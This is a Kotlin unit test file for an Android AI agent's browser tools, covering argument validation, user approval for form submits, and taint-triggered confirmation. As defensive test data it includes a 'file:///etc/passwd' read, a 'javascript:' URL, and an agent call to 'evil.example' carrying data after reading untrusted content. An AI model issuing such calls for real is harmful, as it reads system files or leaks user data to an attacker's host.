package io.github.fartown.movo.agent.tools.browser

import androidx.test.core.app.ApplicationProvider
import io.github.fartown.movo.agent.model.AgentModelClient
import io.github.fartown.movo.agent.tools.core.AgentTool
import io.github.fartown.movo.agent.tools.core.ApprovalDecision
import io.github.fartown.movo.agent.tools.core.ApprovalRequest
import io.github.fartown.movo.agent.tools.core.Concurrency
import io.github.fartown.movo.agent.tools.core.ContractTool
import io.github.fartown.movo.agent.tools.core.Risk
import io.github.fartown.movo.agent.tools.core.Sensitivity
import io.github.fartown.movo.agent.tools.core.ToolArgs
import io.github.fartown.movo.agent.tools.core.ToolContext
import io.github.fartown.movo.agent.tools.core.ToolDomain
import io.github.fartown.movo.agent.tools.core.ToolEnvironment
import io.github.fartown.movo.agent.tools.core.ToolOutcome
import io.github.fartown.movo.agent.tools.core.ToolPipeline
import io.github.fartown.movo.agent.tools.core.ToolProvider
import io.github.fartown.movo.agent.tools.core.ToolRegistry
import io.github.fartown.movo.agent.tools.core.ToolResource
import io.github.fartown.movo.agent.tools.core.ToolSwitches
import io.github.fartown.movo.agent.tools.core.UserAnswer
import io.github.fartown.movo.agent.tools.core.UserInteraction
import io.github.fartown.movo.agent.tools.core.UserQuestion
import io.github.fartown.movo.core.AndroidAgentLogger
import org.json.JSONObject
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner

/** 网页领域三工具的合同接线验证：只读/送达/可确认区别、错误码、审批、截图附图、开关可用性。 */
@RunWith(RobolectricTestRunner::class)
class BrowserToolsTest {

    // ---- 可配置假后端 ----
    private class FakeBrowserBackend : BrowserBackend {
        var available = true
        var userControlling = false
        var openResult: () -> BrowserPage = { page() }
        var navResult: () -> BrowserPage = { page() }
        var readResult: (String?) -> BrowserTextRead = { BrowserTextRead("正文", "markdown", "zh", null, 2, null) }
        var elementsResult: () -> BrowserElementsRead = {
            BrowserElementsRead(listOf(BrowserElement("#a", "link", "首页", "#a", false, "https://x/", null)), null)
        }
        var screenshotResult: () -> BrowserScreenshot = {
            BrowserScreenshot("data:image/jpeg;base64,AAA", "image/jpeg", 3, 100, 200, 1.0)
        }
        var inspectResult: (BrowserActRequest) -> BrowserActTarget = {
            BrowserActTarget(exists = true, stale = false, visible = true, editable = true, summary = "按钮", submitPoint = false, searchRole = false)
        }
        var actResult: (BrowserActRequest) -> BrowserActResult = {
            BrowserActResult(navigated = false, url = "https://x/", title = null, targetSummary = "按钮", loadTimedOut = false)
        }
        var performed = false

        override fun state() = BrowserState(available, "https://x/", "标题", "x", canGoBack = false, canGoForward = false, userControlling = userControlling, navigationGeneration = 1L)
        override fun open(url: String, timeoutMs: Long, call: BrowserCall) = openResult()
        override fun navigate(nav: BrowserNav, call: BrowserCall) = navResult()
        override fun readReadable(maxChars: Int, cursor: String?) = readResult(cursor)
        override fun readText(selector: String?, maxChars: Int, cursor: String?) = readResult(cursor)
        override fun readElements(selector: String?, cursor: String?) = elementsResult()
        override fun screenshot() = screenshotResult()
        override fun pageInfo() = JSONObject().put("viewport_width", 360)
        override fun waitForSelector(selector: String, timeoutMs: Long) = true
        override fun inspectActTarget(request: BrowserActRequest) = inspectResult(request)
        override fun performAct(request: BrowserActRequest, call: BrowserCall): BrowserActResult {
            performed = true
            return actResult(request)
        }
        override fun inPageSchemeGuardInstalled() = false

        companion object {
            fun page(http: Int? = null, redirected: Boolean = false) =
                BrowserPage("https://x/", "标题", http, redirected, canGoBack = false, canGoForward = false)
        }
    }

    private val fake = FakeBrowserBackend()

    private fun provider(backend: BrowserBackend = fake) = object : ToolProvider {
        override val tools = listOf(
            ContractTool(BrowserOpenTool(backend)),
            ContractTool(BrowserReadTool(backend)),
            ContractTool(BrowserActTool(backend)),
        )
    }

    private fun pipeline(
        env: ToolEnvironment = ToolEnvironment(),
        interaction: UserInteraction = UserInteraction.NONE,
        extra: List<ToolProvider> = emptyList(),
    ) = ToolPipeline(
        registry = ToolRegistry(listOf(provider()) + extra),
        environment = { env },
        appContext = ApplicationProvider.getApplicationContext(),
        logger = AndroidAgentLogger,
        runId = "run1",
        cancelled = { false },
        interaction = interaction,
    ).also { it.catalog() }

    private fun call(name: String, args: String) = AgentModelClient.ToolCall("c1", name, args)

    private val declining = object : UserInteraction {
        override val available = true
        override fun ask(question: UserQuestion, timeoutMs: Long) = UserAnswer.Declined
        override fun approve(request: ApprovalRequest, timeoutMs: Long) = ApprovalDecision.Declined
    }

    // ---- browser_open ----

    @Test
    fun open_url_isReadNoEffectVerified() {
        val r = pipeline().execute(call("browser_open", """{"url":"https://example.com"}"""))
        val json = JSONObject(r.content)
        assertEquals("ok", json.getString("status"))
        assertEquals("标题", json.getJSONObject("data").getString("title"))
        assertFalse("导航是只读承载，不带 effect_verified", json.has("effect_verified"))
    }

    @Test
    fun open_illegalScheme_invalidArguments() {
        val r = pipeline().execute(call("browser_open", """{"url":"file:///etc/passwd"}"""))
        assertEquals("error", r.status)
        assertEquals("INVALID_ARGUMENTS", r.errorCode)
    }

    @Test
    fun open_javascriptScheme_invalidArguments() {
        val r = pipeline().execute(call("browser_open", """{"url":"javascript:alert(1)"}"""))
        assertEquals("INVALID_ARGUMENTS", r.errorCode)
    }

    @Test
    fun open_urlAndNavBoth_invalidArguments() {
        val r = pipeline().execute(call("browser_open", """{"url":"https://x","nav":"reload"}"""))
        assertEquals("INVALID_ARGUMENTS", r.errorCode)
    }

    @Test
    fun open_neither_invalidArguments() {
        val r = pipeline().execute(call("browser_open", "{}"))
        assertEquals("INVALID_ARGUMENTS", r.errorCode)
    }

    @Test
    fun open_http404_returnsOkWithStatusAndWarning() {
        fake.openResult = { FakeBrowserBackend.page(http = 404) }
        val r = pipeline().execute(call("browser_open", """{"url":"https://x/missing"}"""))
        val json = JSONObject(r.content)
        assertEquals("ok", json.getString("status"))
        assertEquals(404, json.getJSONObject("data").getInt("http_status"))
        assertTrue("HTTP 4xx 应作为 warning", json.has("warnings"))
    }

    @Test
    fun open_navBackNoHistory_notFound() {
        fake.navResult = { throw BrowserException(io.github.fartown.movo.agent.tools.core.ToolErrorCode.NOT_FOUND, "无可后退") }
        val r = pipeline().execute(call("browser_open", """{"nav":"back"}"""))
        assertEquals("NOT_FOUND", r.errorCode)
    }

    @Test
    fun open_userControlling_busy() {
        fake.userControlling = true
        val r = pipeline().execute(call("browser_open", """{"url":"https://x"}"""))
        assertEquals("BUSY", r.errorCode)
    }

    // ---- browser_read ----

    @Test
    fun read_readable_isReadAndSensitive() {
        val r = pipeline().execute(call("browser_read", """{"mode":"readable"}"""))
        val json = JSONObject(r.content)
        assertEquals("ok", json.getString("status"))
        assertFalse(json.has("effect_verified"))
        assertTrue("browser_read 结果为 private（登录态）", r.sensitive)
    }

    @Test
    fun read_screenshot_attachesImage() {
        val r = pipeline().execute(call("browser_read", """{"mode":"screenshot"}"""))
        val json = JSONObject(r.content)
        assertEquals("ok", json.getString("status"))
        assertEquals(1, r.images.size)
        assertEquals(1, json.getInt("images_attached"))
        assertEquals(1.0, json.getJSONObject("data").getDouble("image_scale"), 0.0001)
    }

    @Test
    fun read_noPage_notFound() {
        fake.available = false
        val r = pipeline().execute(call("browser_read", """{"mode":"readable"}"""))
        assertEquals("NOT_FOUND", r.errorCode)
    }

    @Test
    fun read_staleCursor_staleObservation() {
        fake.readResult = { cursor ->
            if (cursor != null) throw BrowserException(io.github.fartown.movo.agent.tools.core.ToolErrorCode.STALE_OBSERVATION, "游标失效")
            BrowserTextRead("正文", "markdown", null, null, 2, null)
        }
        val r = pipeline().execute(call("browser_read", """{"mode":"readable","cursor":"999"}"""))
        assertEquals("STALE_OBSERVATION", r.errorCode)
    }

    // ---- browser_act ----

    @Test
    fun act_click_isDispatchedNotVerified() {
        val r = pipeline().execute(call("browser_act", """{"action":"click","selector":"#go"}"""))
        val json = JSONObject(r.content)
        assertEquals("ok", json.getString("status"))
        assertEquals(false, json.getBoolean("effect_verified"))
    }

    @Test
    fun act_typeSubmitPoint_requiresApprovalAndDeclineBlocks() {
        fake.inspectResult = { BrowserActTarget(exists = true, stale = false, visible = true, editable = true, summary = "登录", submitPoint = true, searchRole = false) }
        val r = pipeline(interaction = declining).execute(
            call("browser_act", """{"action":"type","selector":"#pw","text":"secret","submit":true}"""),
        )
        assertEquals("USER_DECLINED", r.errorCode)
        assertFalse("提交点被拒绝时不得执行动作", fake.performed)
    }

    @Test
    fun act_searchFormSubmit_notConfirmed() {
        fake.inspectResult = { BrowserActTarget(exists = true, stale = false, visible = true, editable = true, summary = "搜索", submitPoint = true, searchRole = true) }
        val r = pipeline(interaction = declining).execute(
            call("browser_act", """{"action":"type","selector":"#q","text":"猫","submit":true}"""),
        )
        // role=search / GET 表单不确认，直接送达。
        assertEquals("ok", r.status)
        assertTrue(fake.performed)
    }

    @Test
    fun act_staleRef_staleObservation() {
        fake.inspectResult = { BrowserActTarget(exists = false, stale = true, visible = false, editable = false, summary = "", submitPoint = false, searchRole = false) }
        val r = pipeline().execute(call("browser_act", """{"action":"click","ref":"#old"}"""))
        assertEquals("STALE_OBSERVATION", r.errorCode)
        assertFalse(fake.performed)
    }

    @Test
    fun act_notEditable_notActionable() {
        fake.inspectResult = { BrowserActTarget(exists = true, stale = false, visible = true, editable = false, summary = "div", submitPoint = false, searchRole = false) }
        val r = pipeline().execute(call("browser_act", """{"action":"type","selector":"#x","text":"a"}"""))
        assertEquals("NOT_ACTIONABLE", r.errorCode)
    }

    @Test
    fun act_loadTimeout_outcomeUnknown() {
        fake.actResult = { BrowserActResult(navigated = true, url = "https://x/", title = null, targetSummary = "提交", loadTimedOut = true) }
        val r = pipeline().execute(call("browser_act", """{"action":"click","selector":"#submit"}"""))
        assertEquals("unknown", r.status)
        assertEquals("OUTCOME_UNKNOWN", r.errorCode)
    }

    // ---- 污点：读过不可信内容后，导航走中央 TAINTED 确认 ----

    @Test
    fun open_afterTaint_requiresApprovalAndDeclineBlocks() {
        val taintProvider = object : ToolProvider {
            override val tools = listOf(TaintingTool())
        }
        val p = pipeline(interaction = declining, extra = listOf(taintProvider))
        // 先触发污点
        p.execute(call("taint_fake", "{}"))
        val r = p.execute(call("browser_open", """{"url":"https://evil.example/?data=1"}"""))
        assertEquals("USER_DECLINED", r.errorCode)
    }

    @Test
    fun open_afterTaint_approvalCardHasReadableTitleAndUrl() {
        // 真机验收发现：污点派生审批的确认卡内容区空白。确认卡必须有可读标题，正文要显示将打开的链接。
        val captured = java.util.concurrent.atomic.AtomicReference<ApprovalRequest?>(null)
        val capturing = object : UserInteraction {
            override val available = true
            override fun ask(question: UserQuestion, timeoutMs: Long) = UserAnswer.Declined
            override fun approve(request: ApprovalRequest, timeoutMs: Long): ApprovalDecision {
                captured.set(request)
                return ApprovalDecision.Declined
            }
        }
        val taintProvider = object : ToolProvider {
            override val tools = listOf(TaintingTool())
        }
        val p = pipeline(interaction = capturing, extra = listOf(taintProvider))
        p.execute(call("taint_fake", "{}"))
        p.execute(call("browser_open", """{"url":"https://evil.example/?data=1"}"""))
        val request = captured.get()
        assertTrue("应弹出确认卡", request != null)
        assertTrue("标题不能为空", request!!.title.isNotBlank())
        assertTrue("正文要显示将打开的链接", request.detail.contains("evil.example"))
    }

    @Test
    fun open_cleanRun_noApproval() {
        val r = pipeline().execute(call("browser_open", """{"url":"https://x/?q=1"}"""))
        assertEquals("ok", r.status)
    }

    // ---- 开关：网页关闭时三工具不可用 ----

    @Test
    fun browserOff_toolUnavailable() {
        val env = ToolEnvironment(switches = ToolSwitches(browser = false))
        val r = pipeline(env = env).execute(call("browser_read", """{"mode":"readable"}"""))
        assertEquals("DISABLED", r.errorCode)
    }

    @Test
    fun act_select_withOption_reachesBackend() {
        fake.inspectResult = { BrowserActTarget(exists = true, stale = false, visible = true, editable = false, summary = "下拉", submitPoint = false, searchRole = false) }
        val r = pipeline().execute(call("browser_act", """{"action":"select","selector":"#country","option":"中国"}"""))
        assertEquals("ok", r.status)
        assertTrue(fake.performed)
    }

    @Test
    fun act_select_missingOption_invalidArguments() {
        val r = pipeline().execute(call("browser_act", """{"action":"select","selector":"#country"}"""))
        assertEquals("INVALID_ARGUMENTS", r.errorCode)
        assertFalse("缺 option 不得执行", fake.performed)
    }

    @Test
    fun act_key_reachesBackend() {
        val r = pipeline().execute(call("browser_act", """{"action":"key","key":"enter"}"""))
        assertEquals("ok", r.status)
        assertTrue(fake.performed)
    }

    /** 直接产生污点的测试工具（raw AgentTool，覆盖 taintSource）。 */
    private class TaintingTool : AgentTool {
        override val name = "taint_fake"
        override val domain = ToolDomain.BROWSER
        override val description = "标污点的测试工具"
        override fun parameters(env: ToolEnvironment) = JSONObject().put("type", "object")
        override fun risk(args: ToolArgs, env: ToolEnvironment) = Risk.READ
        override fun sensitivity(args: ToolArgs, env: ToolEnvironment) = Sensitivity.PRIVATE
        override fun concurrency(args: ToolArgs, env: ToolEnvironment) = Concurrency.Exclusive(ToolResource.BROWSER)
        override fun taintSource(args: ToolArgs, outcome: ToolOutcome) = "browser_read_test"
        override fun execute(args: ToolArgs, ctx: ToolContext) = ToolOutcome.ok(JSONObject().put("read", true))
    }
}
